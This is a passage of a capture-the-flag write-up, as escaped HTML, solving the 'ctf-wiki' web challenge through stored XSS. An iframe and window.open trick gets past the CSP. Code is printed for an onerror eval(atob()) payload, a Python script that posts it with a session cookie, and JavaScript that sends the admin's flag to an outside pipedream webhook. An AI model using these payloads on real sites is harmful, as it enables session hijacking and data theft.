\u003C/span>\u003Cspan style=\"--0:#B392F0\">flag\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">():\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">adminpw \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> os.environ.get(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"ADMINPW\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">or\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"admin\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> session.get(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"password\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">!=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> adminpw:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> redirect(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"/login?error=\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> urllib.parse.quote_plus(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Not the admin.\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">))\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">flag \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> os.environ.get(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"FLAG\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">or\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"lactf{test-flag}\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> flag, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">200\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"@app.post(&#x22;/flag&#x22;)def flag():    adminpw = os.environ.get(&#x22;ADMINPW&#x22;) or &#x22;admin&#x22;    if session.get(&#x22;password&#x22;) != adminpw:        return redirect(&#x22;/login?error=&#x22; + urllib.parse.quote_plus(&#x22;Not the admin.&#x22;))    flag = os.environ.get(&#x22;FLAG&#x22;) or &#x22;lactf{test-flag}&#x22;    return flag, 200\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>For this, we need to make a post request to \u003Ccode>/flag\u003C/code>, with an account using the correct admin password. Since we have an Admin Bot for this challenge as well, its clear now that we need some sort of XSS to make the admin request this flag for us, and then we can exfiltrate it to a server we control.\u003C/p>\n\u003Cp>And looking at the template for \u003Ccode>view.html\u003C/code>, we can see exactly where this XSS is:\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"html\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">div\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">class\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"ctfer-info\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>{{ description | safe }}&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">div\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"\u003Cdiv class=&#x22;ctfer-info&#x22;>{{ description | safe }}\u003C/div>\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Which in Jinja2 templates will not sanitize the input placed there, meaning we can put arbitrary HTML and JS in the description.\nFinally, we can see a CSP is enforced on the pages with a valid session.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0\">@app.after_request\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">apply_csp\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(response):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> session.get(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"username\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">is\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">and\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> session.get(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"password\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">is\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">response.headers[\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Content-Security-Policy\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">] \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"default-src 'self'; img-src *; font-src https://fonts.gstatic.com https://fonts.googleapis.com; style-src 'self' https://fonts.googleapis.com\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> response\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"@app.after_requestdef apply_csp(response):    if session.get(&#x22;username&#x22;) is not None and session.get(&#x22;password&#x22;) is not None:        response.headers[            &#x22;Content-Security-Policy&#x22;        ] = &#x22;default-src &#x27;self&#x27;; img-src *; font-src https://fonts.gstatic.com https://fonts.googleapis.com; style-src &#x27;self&#x27; https://fonts.googleapis.com&#x22;    return response\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>The \u003Ccode>default-src=self\u003C/code> will be a fallback for CSP directives that were not specified in this list, so when exfiltrating we will additionally need to take this into consideration.\u003C/p>\n\u003Ch2 id=\"solution\">\u003Ca href=\"#solution\">\u003Cstrong>Solution\u003C/strong>\u003C/a>\u003C/h2>\n\u003Cp>The base idea of the challenge will utilize the fact that if the ctf-wiki page is embedded in an iframe on an attacker controlled page, that frame will not send session cookies. Meaning if we can get the Admin to visit our page, and embed the \u003Ccode>/view\u003C/code> endpoint, it will not send the admin session. However, that iframe can create a window using \u003Ccode>window.open\u003C/code>, and the window it creates will send the cookies! Additionally since these are the same origin, the payload in \u003Ccode>/view\u003C/code> will be able to access the window object of the cookie page, and therefore execute JS!\u003C/p>\n\u003Cp>Now from here we can make the fetch request, but we need to somehow send this to our domain.\u003C/p>\n\u003Ch3 id=\"xss-on-window-with-cookies\">\u003Ca href=\"#xss-on-window-with-cookies\">XSS on window with cookies\u003C/a>\u003C/h3>\n\u003Cp>To get a simple POC, we can first create a note that creates a new window, then executes some JS inside that window. I also created this helper script to change the payload on my page quickly.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"py\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> requests\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> base64 \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> b64encode\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">cookies \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'session'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'eyJwYXNzd29yZCI6IjEyMzQiLCJ1c2VybmFtZSI6ImFoaCJ9.ZdLx0w.E2vT2k0HzBa_iXbhdqHgGiR-oxg'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">payload \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">f\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\"\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">w = window.open(\"https://ctf-wiki.chall.lac.tf/\");\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">w.alert(1);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#9ECBFF\">\"\"\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.strip()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">data \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'id'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'d74c05271ee7f058e376451a59086650'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'name'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'asdf'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'image'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'asdf'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'team'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'asdf'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'specialty'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'asdf'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'website'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'asdf'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'description'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">: \u003C/span>\u003Cspan style=\"--0:#F97583\">f\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'&#x3C;img src=x onerror=\"eval(atob(\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\'{\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">b64encode(payload.encode()).decode()\u003C/span>\u003Cspan style=\"--0:#79B8FF\">}\\'\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">))\">'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">response \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> requests.post(\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'https://ctf-wiki.chall.lac.tf/edit/d74c05271ee7f058e376451a59086650'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#FFAB70\">cookies\u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">cookies,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#FFAB70\">data\u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">data,\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"import requestsfrom base64 import b64encodecookies = {    &#x27;session&#x27;: &#x27;eyJwYXNzd29yZCI6IjEyMzQiLCJ1c2VybmFtZSI6ImFoaCJ9.ZdLx0w.E2vT2k0HzBa_iXbhdqHgGiR-oxg&#x27;,}payload = f&#x22;&#x22;&#x22;w = window.open(&#x22;https://ctf-wiki.chall.lac.tf/&#x22;);w.alert(1);&#x22;&#x22;&#x22;.strip()data = {    &#x27;id&#x27;: &#x27;d74c05271ee7f058e376451a59086650&#x27;,    &#x27;name&#x27;: &#x27;asdf&#x27;,    &#x27;image&#x27;: &#x27;asdf&#x27;,    &#x27;team&#x27;: &#x27;asdf&#x27;,    &#x27;specialty&#x27;: &#x27;asdf&#x27;,    &#x27;website&#x27;: &#x27;asdf&#x27;,    &#x27;description&#x27;: f&#x27;\u003Cimg src=x onerror=&#x22;eval(atob(\\&#x27;{b64encode(payload.encode()).decode()}\\&#x27;))&#x22;>&#x27;,}response = requests.post(    &#x27;https://ctf-wiki.chall.lac.tf/edit/d74c05271ee7f058e376451a59086650&#x27;,    cookies=cookies,    data=data,)\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Then we can host the \u003Ccode>/view\u003C/code> endpoint for this page on our own domain in an iframe.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"html\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#85E89D\">iframe\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#B392F0\">id\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"thing\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">  \u003C/span>\u003Cspan style=\"--0:#B392F0\">src\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">=\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"https://ctf-wiki.chall.lac.tf/view/d74c05271ee7f058e376451a59086650\"\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">>&#x3C;/\u003C/span>\u003Cspan style=\"--0:#85E89D\">iframe\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">>\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"\u003Ciframe  id=&#x22;thing&#x22;  src=&#x22;https://ctf-wiki.chall.lac.tf/view/d74c05271ee7f058e376451a59086650&#x22;>\u003C/iframe>\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>When we visit our site now when logged in on ctf-wiki, (after enabling popups) we can see a page opened and an alert fired.\n\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;./image-1.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\nWhats important is that the alert is on the new page, and additionally, we can see that the new page will be logged in.\n\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;./image-3.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>Now we can try adjusting our payload to make a fetch to \u003Ccode>/flag\u003C/code>, and send it to a webhook.\u003C/p>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"js\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">w \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> window.\u003C/span>\u003Cspan style=\"--0:#B392F0\">open\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"https://ctf-wiki.chall.lac.tf/\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">);\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">w.\u003C/span>\u003Cspan style=\"--0:#B392F0\">onload\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> () \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">  \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">w.\u003C/span>\u003Cspan style=\"--0:#B392F0\">fetch\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"https://ctf-wiki.chall.lac.tf/flag\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, { method: \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"POST\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> })\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.\u003C/span>\u003Cspan style=\"--0:#B392F0\">then\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">((\u003C/span>\u003Cspan style=\"--0:#FFAB70\">r\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> r.\u003C/span>\u003Cspan style=\"--0:#B392F0\">text\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">())\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">.\u003C/span>\u003Cspan style=\"--0:#B392F0\">then\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">((\u003C/span>\u003Cspan style=\"--0:#FFAB70\">r\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">) \u003C/span>\u003Cspan style=\"--0:#F97583\">=>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">      \u003C/span>\u003Cspan style=\"--0:#B392F0\">fetch\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"https://eo4r52sc1021bl8.m.pipedream.net?flag=\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">+\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">btoa\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(r));\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">});\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">};\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"w = window.open(&#x22;https://ctf-wiki.chall.lac.tf/&#x22;);w.onload = () => {  w.fetch(&#x22;https://ctf-wiki.chall.lac.tf/flag&#x22;, { method: &#x22;POST&#x22; })    .then((r) => r.text())    .then((r) => {      fetch(&#x22;https://eo4r52sc1021bl8.m.pipedream.net?flag=&#x22; + btoa(r));    });};\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Cp>Note here we are using \u003Ccode>w.fetch\u003C/code> to fetch the \u003Ccode>/flag\u003C/code> endpoint, but just fetch to send it back to us. This is since the CSP will prevent using \u003Ccode>w.fetch\u003C/code> to make a request outside the \u003Ccode>https://ctf-wiki.chall.lac.tf/\u003C/code> origin, however the cookieless page does not have that CSP restriction.\u003C/p>\n\u003Cp>Finally, we send this to the Admin Bot, get our callback, and base64 decode to get the flag!\n\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;./image-4.png&#x22;,&#x22;alt&#x22;:&#x22;&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"flag\">\u003Ca href=\"#flag\">Flag\u003C/a>\u003C/h2>\n\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame\">\u003Cfigcaption class=\"header\">\u003C/figcaption>\u003Cpre data-language=\"plaintext\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#e1e4e8\">lactf{k4NT_k33P_4lL_my_F4v0r1T3_ctF3RS_S4m3_S1t3}\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003C/pre>\u003Cdiv class=\"copy\">\u003Cbutton title=\"Copy to clipboard\" data-copied=\"Copied!\" data-code=\"lactf{k4NT_k33P_4lL_my_F4v0r1T3_ctF3RS_S4m3_S1t3}\">\u003Cdiv>\u003C/div>\u003C/button>\u003C/div>\u003C/figure>\u003C/div>\n\u003Ch2 id=\"additional-notes\">\u003Ca href=\"#additional-notes\">Additional Notes\u003C/a>\u003C/h2>\n\u003Cp>During the CTF, I honestly don’t know why I didn’t try this. I think I accidently tried \u003Ccode>w.fetch\u003C/code> when exfiltrating (instead of just fetch), got the \u003Ccode>connect-uri\u003C/code> CSP issue, and then just resorted to the option I knew on how to solve that which was using WebRTC.\u003C/p>\n\u003Cp>A reference for that payload is this very well written writeup for SekaiCTF GolfJail which used that same technique.\n\u003Ca 